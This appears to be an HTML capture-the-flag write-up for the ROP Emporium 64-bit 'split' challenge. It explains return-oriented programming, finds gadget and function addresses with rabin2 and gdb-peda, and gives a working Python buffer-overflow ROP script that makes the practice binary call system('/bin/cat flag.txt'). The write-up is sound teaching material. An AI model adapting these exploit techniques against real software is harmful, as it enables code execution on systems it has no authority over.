@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>#ROP Emporium - 64bit - split</strong></h1>
+        <a href="https://ropemporium.com/challenge/split.html">https://ropemporium.com/challenge/split.html</a><br>
+        <br>
+        <img alt="images\3-1.png" src="images/3-1.png"><br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>Challenge Description</strong></h2><br>
+        Description for <code>split</code> on ropemporium:<br>
+            <div class="codebox">
+                In&nbsp;this&nbsp;challenge&nbsp;the&nbsp;elements&nbsp;that&nbsp;allowed&nbsp;you&nbsp;to&nbsp;complete&nbsp;the&nbsp;ret2win&nbsp;challenge&nbsp;are&nbsp;still&nbsp;present,&nbsp;they've&nbsp;just&nbsp;been&nbsp;split&nbsp;apart.&nbsp;Find&nbsp;them&nbsp;and&nbsp;recombine&nbsp;them&nbsp;using&nbsp;a&nbsp;short&nbsp;ROP&nbsp;chain.
+            </div>
+        </div><br>
+        <br>
+        This is challenge is our first exposure to ROP.<br>
+        This time, there's no "win" function that will read the flag for us. Instead, we have to build a command that will read the flag for us.<br>
+        <br>
+        As mentioned in the description, everything we need to read the flag - the <code>system()</code> function, a <code>"/bin/cat flag.txt"</code> string, and a <code>pop rdi; ret</code> gadget are all present within the binary. We just have to find them to package them together in an exploit.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>About ROP</strong></h2><br>
+        ROP stands for Return Oriented Programming. It's a technique used in exploit development to run arbtritray code using instructions already present in the program's code. You can read a compiled binary's assembly code by running <code>objdump -d &lt;binary&gt;</code>.<br>
+        <br>
+        ROP is often used when you're unable to drop shellcode onto the stack or are limited by binary protections.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>Gadgets</strong></h3><br>
+        ROP makes use of "gadgets".<br>
+        Gadgets are assembly instructions already present in the program's code that end in a <code>ret</code> instruction.<br>
+        <br>
+        <code>ret</code> is an assembly instruction, and stands for "return".<br>
+        This <code>ret</code> instruction allows you to run an assembly instruction of your choice and then "return" to another place in memory, such as the address of another <code>assembly instruction + ret</code> instruction.<br>
+        <br>
+        By chaining gadgets together (that is, chaining <code>assembly instruction + ret</code> sequences already present in the binary's code together), you can run arbitrary code by chaining instructions already present in the program's code.<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>ROP Example</strong></h3><br>
+        For example, you want to call the <code>mprotect()</code> function, which can be used to set the permissions of the to stack to executable.<br>
+        This requires RAX to contain <code>mprotect()</code>'s syscall number <code>10</code>.<br>
+        <br>
+        You've found 2 gadgets in the binary:<br>
+        • <code>mov rax, 0x07; ret</code> located at <code>0x200</code><br>
+        • <code>add rax, 0x3; ret</code> located <code>0x300</code><br>
+        <br>
+        And you've got the address of libc <code>syscall()</code>, used to call <code>mprotect()</code><br>
+        • libc <code>syscall()</code> located at <code>0x800</code><br>
+        <br>
+        <strong>Psuedo ROP Script</strong><br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">from</span>&nbsp;pwn&nbsp;<span style="color:#333333;font-weight:400">import</span>&nbsp;*<br>
+                <br>
+                mov_rax_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x200</span>)<br>
+                add_rax_ret&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x300</span>)<br>
+                libc_syscall&nbsp;=&nbsp;p64(<span style="color:#ff0044;font-weight:400">0x800</span>)<br>
+                <br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offset&nbsp;to&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;mov_rax_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;mov&nbsp;rax,&nbsp;0x07;&nbsp;ret</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ROP&nbsp;chain&nbsp;START</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ret&nbsp;1</span><br>
+                payload&nbsp;+=&nbsp;add_rax_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;return&nbsp;to&nbsp;add&nbsp;rax,&nbsp;0x03;&nbsp;ret&nbsp;instruction</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;ret&nbsp;2</span><br>
+                payload&nbsp;+=&nbsp;libc_syscall&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;return&nbsp;to&nbsp;libc&nbsp;syscall()&nbsp;function&nbsp;to&nbsp;call&nbsp;mprotect()</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <strong>#1</strong><br>
+        First, you overflow the buffer, and overwrite RIP with the address of <code>mov rax, 0x07; ret</code> - <code>0x200</code>.<br>
+        <code>mov</code> will move <code>7</code> into RAX.<br>
+        <code>ret</code> will read the next address on the stack and return to it (<code>0x300</code>).<br>
+        <br>
+        <strong>#2</strong><br>
+        Second, you write the address of <code>add rax, 0x3; ret</code> to the stack - <code>0x300</code>.<br>
+        <code>0x300</code> is what <code>ret</code> from the previous <code>mov rax, 0x07; ret</code> instruction will jump/return to.<br>
+        This means that <code>add rax, 0x3; ret</code> will run and 3 will be added to RAX.<br>
+        <br>
+        RAX now contains 10, the syscall number for our <code>mprotect()</code> function.<br>
+        <br>
+        <strong>#3</strong><br>
+        Lastly, we write the address of libc <code>syscall()</code> to the stack.<br>
+        The <code>ret</code> instruction from <code>add rax, 0x3; ret</code> will jump/return to the address of libc <code>syscall()</code> and run it, and our <code>mprotect()</code> function will execute.<br>
+        <br>
+        We've successfully set up RAX using ROP gadgets and run the mprotect() function.<br>
+        <br>
+        <strong>Summary</strong><br>
+        • You move 7 into RAX, and return to the next instruction<br>
+        • You add 3 to RAX, and return to the next instruction<br>
+        • You run syscall(), which takes the number in RAX and calls that function - mprotect()<br>
+        <br>
+        *NOTE: This example ROP chain wouldn't work because it's mixing 64-bit registers with 32-bit calling conventions. It works as an example, but don't try using it.<br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>The Key to ROP</strong></h3><br>
+        You'll notice from all of this is that the key to ROP is <code>ret</code>.<br>
+        Without <code>ret</code>, you can't return to another instruction and your chain of instructions/ROP chain will end.<br>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>About 64-bit Calling Conventions</strong></h2><br>
+        When you call a function, you have to set up the function's parameters.<br>
+        <br>
+        On 32-bit machines, parameters for functions are read from the stack.<br>
+        On 64-bit machines, parameters for functions are read from registers, not the stack.<br>
+        <br>
+        The parameters are read from registers in this order - <code>RDI, RSI, RDX, RCX, R8, R9</code><br>
+        If there are more than 6 parameters, extra parameters are placed onto the stack.<br>
+        <br>
+        If you're building a ROP chain, you'll probably need to find a <code>pop rdi; ret</code> gadget since most functions often require at least 1 parameter.<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>split Solution</strong></h2><br>
+        To exploit split and read the flag, we need to find:<br>
+        • The address of <code>system()</code><br>
+        • The address of a "/bin/cat flag.txt" string<br>
+        • A <code>pop rdi; ret</code> gadget to pop a "/bin/cat flag.txt" into RDI so that it can be used with system()<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>1) Find address of system()</strong></h2><br>
+        Have a look for system() in the binary's imports.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/2-split#&nbsp;rabin2&nbsp;-i&nbsp;split<br>
+                [Imports]<br>
+                Num&nbsp;&nbsp;Vaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bind&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Type&nbsp;Name<br>
+                &nbsp;&nbsp;&nbsp;1&nbsp;0x004005d0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;puts<br>
+                &nbsp;&nbsp;&nbsp;2&nbsp;0x004005e0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;system<br>
+                &nbsp;&nbsp;&nbsp;3&nbsp;0x004005f0&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;printf<br>
+                &nbsp;&nbsp;&nbsp;4&nbsp;0x00400600&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;memset<br>
+                &nbsp;&nbsp;&nbsp;5&nbsp;0x00400610&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;__libc_start_main<br>
+                &nbsp;&nbsp;&nbsp;6&nbsp;0x00400620&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;fgets<br>
+                &nbsp;&nbsp;&nbsp;7&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;__gmon_start__<br>
+                &nbsp;&nbsp;&nbsp;8&nbsp;0x00400630&nbsp;&nbsp;GLOBAL&nbsp;&nbsp;&nbsp;&nbsp;FUNC&nbsp;setvbuf<br>
+                &nbsp;&nbsp;&nbsp;7&nbsp;0x00000000&nbsp;&nbsp;&nbsp;&nbsp;WEAK&nbsp;&nbsp;NOTYPE&nbsp;__gmon_start__
+            </div>
+        </div><br>
+        <br>
+        <code>system()</code> is located at <code>0x004005e0</code>.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>2) Find a "/bin/cat flag.txt" string</strong></h2><br>
+        Have a look for a "/bin/cat flag.txt" string using rabin2.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/2-split#&nbsp;rabin2&nbsp;-z&nbsp;split<br>
+                [Strings]<br>
+                Num&nbsp;Paddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Vaddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Len&nbsp;Size&nbsp;Section&nbsp;&nbsp;Type&nbsp;&nbsp;String<br>
+                000&nbsp;0x000008a8&nbsp;0x004008a8&nbsp;&nbsp;21&nbsp;&nbsp;22&nbsp;(.rodata)&nbsp;ascii&nbsp;split&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                001&nbsp;0x000008be&nbsp;0x004008be&nbsp;&nbsp;&nbsp;7&nbsp;&nbsp;&nbsp;8&nbsp;(.rodata)&nbsp;ascii&nbsp;64bits\n<br>
+                002&nbsp;0x000008c6&nbsp;0x004008c6&nbsp;&nbsp;&nbsp;8&nbsp;&nbsp;&nbsp;9&nbsp;(.rodata)&nbsp;ascii&nbsp;\nExiting<br>
+                003&nbsp;0x000008d0&nbsp;0x004008d0&nbsp;&nbsp;43&nbsp;&nbsp;44&nbsp;(.rodata)&nbsp;ascii&nbsp;Contriving&nbsp;a&nbsp;reason&nbsp;to&nbsp;ask&nbsp;user&nbsp;for&nbsp;data...<br>
+                004&nbsp;0x000008ff&nbsp;0x004008ff&nbsp;&nbsp;&nbsp;7&nbsp;&nbsp;&nbsp;8&nbsp;(.rodata)&nbsp;ascii&nbsp;/bin/ls<br>
+                000&nbsp;0x00001060&nbsp;0x00601060&nbsp;&nbsp;17&nbsp;&nbsp;18&nbsp;(.data)&nbsp;ascii&nbsp;/bin/cat&nbsp;flag.txt
+            </div>
+        </div><br>
+        <br>
+        A <code>"/bin/cat flag.txt"</code> string is available in the .data section of the binary at <code>0x00601060</code>.<br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>3) Find a gadget to setup system()</strong></h2><br>
+        Lastly, look for a pop rdi; ret gadget using gdb-peda.<br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/2-split#&nbsp;gdb&nbsp;-q&nbsp;split<br>
+                Reading&nbsp;symbols&nbsp;from&nbsp;split...(no&nbsp;debugging&nbsp;symbols&nbsp;found)...done.<br>
+                gdb-peda$&nbsp;break&nbsp;main<br>
+                Breakpoint&nbsp;1&nbsp;at&nbsp;0x40074a<br>
+                gdb-peda$&nbsp;run<br>
+                Starting&nbsp;program:&nbsp;/root/ctf/ropemporium/2-split/split&nbsp;<br>
+                <br>
+                ...<br>
+                <br>
+                Breakpoint&nbsp;1,&nbsp;0x000000000040074a&nbsp;in&nbsp;main&nbsp;()<br>
+                gdb-peda$&nbsp;ropsearch&nbsp;"pop&nbsp;rdi;&nbsp;ret"<br>
+                Searching&nbsp;for&nbsp;ROP&nbsp;gadget:&nbsp;'pop&nbsp;rdi;&nbsp;ret'&nbsp;in:&nbsp;binary&nbsp;ranges<br>
+                0x00400883&nbsp;:&nbsp;(b'5fc3') pop&nbsp;rdi;&nbsp;ret
+            </div>
+        </div><br>
+        <br>
+        There's a <code>pop rdi; ret</code> instruction at <code>0x00400883</code>.<br>
+        <br>
+        <a id="h2-8" name="h2-8"></a><strong></strong>
+        <h2><strong>4) Write exploit script</strong></h2><br>
+        At this point, we have everything we need to read our flag.<br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>Exploit plan</strong></h3><br>
+        1. Overflow the buffer with 40 bytes of junk<br>
+        2. Overwrite RIP with a <code>pop rdi; ret</code> instruction<br>
+        3. Write the <code>"/bin/cat flag.txt"</code> string onto the stack so that it'll be popped into RDI<br>
+        4. Run <code>system()</code><br>
+        <br>
+        <a id="h3-5" name="h3-5"></a><strong></strong>
+        <h3><strong>Python script</strong></h3><br>
+            <div class="codebox">
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;struct<br>
+                <br>
+                pop_rdi_ret&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00400883</span>)<br>
+                cat_flag_string_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x00601060</span>)<br>
+                system_addr&nbsp;=&nbsp;struct.pack(<span style="color:#3ad900;font-weight:400">'&lt;Q'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">0x004005e0</span>)<br>
+                <br>
+                payload&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">40</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;offest&nbsp;to&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;pop_rdi_ret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;overwrite&nbsp;RIP</span><br>
+                payload&nbsp;+=&nbsp;cat_flag_string_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;pop&nbsp;"/bin/cat&nbsp;flag.txt"&nbsp;into&nbsp;RDI</span><br>
+                payload&nbsp;+=&nbsp;system_addr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;run&nbsp;system("/bin/cat&nbsp;flag.txt")</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;payload
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-9" name="h2-9"></a><strong></strong>
+        <h2><strong>5) Win!</strong></h2><br>
+            <div class="codebox">
+                root@city64:~/ctf/ropemporium/2-split#&nbsp;python&nbsp;splitpwn.py&nbsp;|&nbsp;./split<br>
+                split&nbsp;by&nbsp;ROP&nbsp;Emporium<br>
+                64bits<br>
+                <br>
+                Contriving&nbsp;a&nbsp;reason&nbsp;to&nbsp;ask&nbsp;user&nbsp;for&nbsp;data...<br>
+                &gt;&nbsp;ROPE{a_placeholder_32byte_flag!}<br>
+                Segmentation&nbsp;fault
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
